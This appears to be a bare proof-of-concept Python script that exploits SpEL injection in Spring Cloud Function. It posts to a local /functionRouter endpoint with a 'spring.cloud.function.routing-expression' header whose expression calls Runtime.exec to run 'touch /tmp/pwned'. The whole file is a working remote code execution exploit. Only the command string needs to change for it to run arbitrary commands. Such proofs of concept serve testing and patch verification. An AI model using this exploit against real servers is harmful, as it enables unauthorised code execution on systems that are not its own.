import requests
myHeaders = {
        "spring.cloud.function.routing-expression" : "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")",
        }
result = requests.post("http://127.0.0.1:8080/functionRouter", headers = myHeaders, data = "XXX")

